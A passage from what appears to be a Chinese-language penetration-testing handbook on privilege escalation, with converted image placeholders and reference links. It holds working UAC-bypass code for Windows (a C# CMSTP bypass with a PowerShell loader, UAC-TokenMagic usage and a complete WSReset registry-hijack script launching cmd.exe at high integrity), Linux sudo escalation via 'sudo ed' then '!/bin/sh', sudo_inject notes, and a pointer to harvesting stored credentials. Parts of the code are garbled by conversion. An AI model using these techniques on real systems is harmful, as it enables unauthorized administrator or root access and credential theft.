StringBuilder newInfData = new StringBuilder(InfData);
> newInfData.Replace(\"REPLACE_COMMAND_LINE\", CommandToExecute);
> File.WriteAllText(OutputFile.ToString(), newInfData.ToString());
>
> return OutputFile.ToString();
>
> }
>
> public static bool Execute(string CommandToExecute)
>
> {
>
> if(!File.Exists(BinaryPath))
>
> {
>
> Console.WriteLine(\"Could not find cmstp.exe binary!\"); return false;
>
> }
>
> StringBuilder InfFile = new StringBuilder();
> InfFile.Append(SetInfFile(CommandToExecute));
>
> Console.WriteLine(\"Payload file written to \" + InfFile.ToString());
> ProcessStartInfo startInfo = new ProcessStartInfo(BinaryPath);
> startInfo.Arguments = \"/au \" + InfFile.ToString();
> startInfo.UseShellExecute = false;
>
> Process.Start(startInfo);
>
> IntPtr windowHandle = new IntPtr(); windowHandle = IntPtr.Zero;
>
> do {
>
> windowHandle = SetWindowActive(\"cmstp\");
>
> } while (windowHandle == IntPtr.Zero);
>
> System.Windows.Forms.SendKeys.SendWait(\"{ENTER}\"); return true;
>
> }
>
> public static IntPtr SetWindowActive(string ProcessName)
>
> {
>
> Process\[\] target = Process.GetProcessesByName(ProcessName);
> if(target.Length == 0) return IntPtr.Zero;
>
> target\[0\].Refresh();
>
> IntPtr WindowHandle = new IntPtr(); WindowHandle =
> target\[0\].MainWindowHandle; if(WindowHandle == IntPtr.Zero) return
> IntPtr.Zero; SetForegroundWindow(WindowHandle);
> ShowWindow(WindowHandle, 5);
>
> return WindowHandle;
>
> }
>
> }
>
> Add-Type -TypeDefinition
> (\[IO.File\]::ReadAllText(\"\$pwd\\Source.cs\")) -ReferencedA
> ssemblies \"System.Windows.Forms\" -OutputAssembly
> \"CMSTP-UAC-Bypass.dll\"
> \[Reflection.Assembly\]::Load(\[IO.File\]::ReadAllBytes(\"\$pwd\\CMSTP-UAC-Bypass.dll
> \"))
>
> \[CMSTPBypass\]::Execute(\"C:\\Windows\\System32\\cmd.exe\")
![](media/image191.jpeg){width="5.883521434820647in"
height="3.4191666666666665in"}
###### UAC-TokenMagic.ps1绕UAC
https://github.com/FuzzySecurity/PowerShell-Suite
参考：
https://tyranidslair.blogspot.co.uk/2017/05/reading-your-way-around-uac-
part-1.html
https://tyranidslair.blogspot.co.uk/2017/05/reading-your-way-
around-uac-part-2.html
https://tyranidslair.blogspot.co.uk/2017/05/reading-your-way-around-uac-
part-3.html
> .EXAMPLE C:\\PS\> UAC-TokenMagic -BinPath
> C:\\Windows\\System32\\cmd.exe . EXAMPLE C:\\PS\> UAC-TokenMagic
> -BinPath C:\\Windows\\System32\\cmd.exe -Ar gs \"/c ca
>
> lc.exe\" -ProcPID 1116
>
> C:\\PS\> UAC-TokenMagic -BinPath C:\\Windows\\System32\\cmd.exe
> -ProcPID 362 4
![](media/image192.jpeg){width="5.878956692913386in"
height="3.006666666666667in"}
###### ctftool20年BUG
谷歌披露了影响所有Windows 版本的 20 年未修补漏洞
已测试 WIN10
![](media/image193.jpeg){width="5.816676509186352in"
height="2.946561679790026in"}
替换里面的 payload.dll 就可以了
![](media/image194.jpeg){width="5.746117672790901in"
height="3.198124453193351in"}
https://thehackernews.com/2019/08/ctfmon-windows-vulnerabilities.html
https://github.com/taviso/ctftool/releases
###### 需bypassuac-再getsystem
![](media/image195.jpeg){width="4.655in"
height="2.2859372265966753in"}![](media/image196.jpeg){width="5.820050306211724in"
height="1.734374453193351in"}![](media/image197.jpeg){width="4.613437226596675in"
height="2.49375in"}
https://github.com/sailay1996/tokenx_privEsc
[https://demonsec666.oss-cn-](https://demonsec666.oss-cn-qingdao.aliyuncs.com/暗€杩嘦AC-getsystem.zip)
qingdao.aliyuncs.com/%E9%9C%80%E8%BF%87UAC-getsystem.zip
http://www.ggsec.cn/uac-getsystem.html 已打包
###### WSReset-UAC
![](media/image198.jpeg){width="5.909868766404199in" height="2.96in"}
> \
> .SYNOPSIS
>
> FilelessUACBypassbyAbusingShellAPI Author:HashimJawadofACTIVELabs
>
> .PARAMETERCommand
> Specifiesthecommandyouwouldliketoruninhighintegritycontext.
>
> .EXAMPLE
>
> Invoke-WSResetBypass-Command\"C:\\Windows\\System32\\cmd.exe/cstartcmd.
> exe\"
>
> Thiswilleffectivlystartcmd.exeinhighintegritycontext.
>
> .NOTES
>
> ThisUACbypasshasbeentestedonthefollowing:
>
> -Windows10Version1803OSBuild17134.590
>
> -Windows10Version1809OSBuild17763.316 #\>
>
> function Invoke-WSResetBypass { Param (
>
> \[String\]\$Command = \"C:\\Windows\\System32\\cmd.exe /c start
> cmd.exe\"
>
> )
>
> \$CommandPath =
> \"HKCU:\\Software\\Classes\\AppX82a6gwre4fdg3bt635tn5ctq
> jf8msdd2\\Shell\\open\\command\"
>
> \$filePath =
> \"HKCU:\\Software\\Classes\\AppX82a6gwre4fdg3bt635tn5ctqjf8msd
> d2\\Shell\\open\\command\"
>
> New-Item \$CommandPath -Force \| Out-Null
>
> New-ItemProperty -Path \$CommandPath -Name \"DelegateExecute\" -Value
> \"\"
>
> -Force \| Out-Null
>
> Set-ItemProperty -Path \$CommandPath -Name \"(default)\" -Value
> \$Command
>
> -Force -ErrorAction SilentlyContinue \| Out-Null
>
> Write-Host \"\[+\] Registry entry has been created successfully!\"
>
> \$Process = Start-Process -FilePath
> \"C:\\Windows\\System32\\WSReset.exe\" -W indowStyle Hidden
>
> Write-Host \"\[+\] Starting WSReset.exe\"
>
> Write-Host \"\[+\] Triggering payload..\" Start-Sleep -Seconds 5
>
> if (Test-Path \$filePath) {
>
> Remove-Item \$filePath -Recurse -Force Write-Host \"\[+\] Cleaning up
> registry entry\"
>
> }
>
> }
参 考 资 料 ：
https://[www.activecyber.us/activelabs/windows-uac-bypass](http://www.activecyber.us/activelabs/windows-uac-bypass)
3.  ####### Linux:
    1.  **利用 linux 中的 ed 文本编辑器提升权限**
ed 命令是一个面向行的文本编辑器命令。安全性的重点在于，SUDO Lab
设置特权升级，利用SUDO。 ed 是linux 历史长河中遗留下来的老古董编辑器，于
1969 年开发，由vi 等文本编辑器继承。
在提及安全性问题之前，肯定要先彻底了解一下ed 才行。
这里做一下总结性的提炼。更多细节请阅读文末的参考资料：linux 渗透测试，ed
权限提升
-   ed 文本编辑器基本操作：ed 初始化文件，a 输入，. 编辑，w 后跟文件名，
    q 退出编辑器
-   使用ed 编辑文件：ed info.txt
-   更改任何特定的行：显示行与行号的交互参数，p，n，更改该行 c
-   通过使用ed 显示错误消息：ed
    无法理解的内容显示问号，更多有关错误的信息 h
-   通过ed 复制和移动操作：复制 t ，移动 m
-   使用ed 进行搜索操作：ed -p% info.txt，搜索关键字：%/linux 利用ed
-   Sudo Rights Lab 设置了权限提升:配置文件设置好，test 用户的root
    权限和
> NOPASSWD: /bin/ed
-   利用Sudo 权利：输入sudo -l，sudo ed，!/bin/sh
最终就是利用了配置文件的地方，发现test 用户在无密码的设置中可以以root
权限去运行ed 编辑器， 最后利用输入sudo -l，sudo ed，!/bin/sh，test
用户就得到了root 权限的shell 来交互命令行了。
参考资料 linux 渗透测试，ed
权限提升：https://[www.hackingarticles.in/linux-](http://www.hackingarticles.in/linux-)
for-pentester-ed-privilege-escalation/ 利用Linux 文本操作命令ed
进行提权：https://[www.freebuf.com/sectool/209494.html](http://www.freebuf.com/sectool/209494.html)
####### LINUX sudo （T1169）
https://github.com/nongiach/sudo_inject1
![](media/image199.jpeg){width="5.833333333333333in"
height="1.0733322397200349in"}1.执行作者的exp
2\.
观察sudo 的结构体
> ![](media/image200.jpeg){width="4.660662729658792in"
> height="2.2733333333333334in"}
1.  sudo ls 等于获取权限
2.  sudo id 可以看到sudo 等于获取root 权限
![](media/image201.jpeg){width="5.803594706911636in"
height="3.0493744531933507in"}
3.  sudo -i 等于获取root 权限并以root 权限使用shell 登录
> ![](media/image202.jpeg){width="5.833333333333333in"
> height="4.0633333333333335in"}4.
作者在以上基础增加修改 进行sudo 注入
![](media/image203.jpeg){width="5.625164041994751in"
height="2.673124453193351in"}
![](media/image204.png){width="5.817038495188101in" height="4.76in"}
####### ![](media/image205.jpeg){width="5.770538057742782in" height="0.6413538932633421in"}LINUX sudo （T1169）
 https://gtfobins.github.io/
![](media/image206.jpeg){width="5.851891951006124in"
height="3.875624453193351in"}
![](media/image207.jpeg){width="5.8508836395450565in"
height="1.5279166666666666in"}
####### ![](media/image208.jpeg){width="4.965545713035871in" height="2.4283333333333332in"}sudo-ed-提权
https://[www.hackingarticles.in/linux-for-pentester-ed-privilege-escalation/](http://www.hackingarticles.in/linux-for-pentester-ed-privilege-escalation/)
https://[www.freebuf.com/sectool/209494.html](http://www.freebuf.com/sectool/209494.html)
####### 存储凭证
进入系统以后，第一个动作就是看看系统里面有没有账户密码之类的凭证。
拿到高权限账号密码直接就是高权限的提升了。。。
无人部署的方式安装Windows
服务器系统时，会遗留很多敏感信息文件，其中就包含了xml 格式的文件，
获取信息的方式就是英文词语翻译它们的标签。